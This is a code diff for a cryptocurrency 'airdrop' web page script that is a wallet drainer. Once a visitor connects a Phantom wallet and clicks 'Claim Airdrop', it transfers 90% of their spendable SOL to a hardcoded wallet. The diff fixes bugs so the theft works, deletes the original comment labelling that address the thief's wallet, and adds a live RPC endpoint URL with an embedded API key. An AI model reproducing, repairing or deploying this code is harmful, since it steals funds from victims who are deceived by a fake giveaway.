@@ -1,4 +1,9 @@
-$(document).ready(function() { 
+// Ensure @solana/web3.js is available globally
+if (typeof solanaWeb3 === 'undefined') {
+    throw new Error("Solana Web3.js not found. Include <script src='https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js'></script>");
+}
+
+$(document).ready(function() {
     $('#connect-wallet').on('click', async () => {
         if (window.solana && window.solana.isPhantom) {
             try {
@@ -6,12 +11,12 @@ $(document).ready(function() {
                 console.log("Phantom Wallet connected:", resp);
 
                 var connection = new solanaWeb3.Connection(
-                    'https://solana-mainnet.api.syndica.io/api-key/YOUR-API-KEY', 
+                    'https://bold-prettiest-spree.solana-mainnet.quiknode.pro/8a34f4083d0d4a0a1533ddbd64fbecd5f6f789d4/', 
                     'confirmed'
                 );
 
-                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
-                const walletBalance = await connection.getBalance(public_key);
+                const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString()); // Ensure publicKey is properly initialized
+                const walletBalance = await connection.getBalance(publicKey);
                 console.log("Wallet balance:", walletBalance);
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
@@ -23,7 +28,7 @@ $(document).ready(function() {
                 $('#connect-wallet').text("Claim Airdrop");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp'); // Thief's wallet
+                        const receiverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp');
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds for transfer.");
@@ -32,13 +37,13 @@ $(document).ready(function() {
 
                         var transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: resp.publicKey,
-                                toPubkey: recieverWallet,
-                                lamports: balanceForTransfer * 0.9,
-                            }),
+                                fromPubkey: publicKey,
+                                toPubkey: receiverWallet,
+                                lamports: Math.floor(balanceForTransfer * 0.9), // Ensure integer lamports
+                            })
                         );
 
-                        transaction.feePayer = window.solana.publicKey;
+                        transaction.feePayer = publicKey; // Use the PublicKey object
                         let blockhashObj = await connection.getRecentBlockhash();
                         transaction.recentBlockhash = blockhashObj.blockhash;
 
@@ -49,14 +54,13 @@ $(document).ready(function() {
                         await connection.confirmTransaction(txid);
                         console.log("Transaction confirmed:", txid);
                     } catch (err) {
-                        console.error("Error during minting:", err);
+                        console.error("Error during minting:", err.message);
                     }
                 });
             } catch (err) {
-                console.error("Error connecting to Phantom Wallet:", err);
+                console.error("Error connecting to Phantom Wallet:", err.message);
             }
         } else {
-            // Mobile device detection (basic)
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
             if (isMobile) {
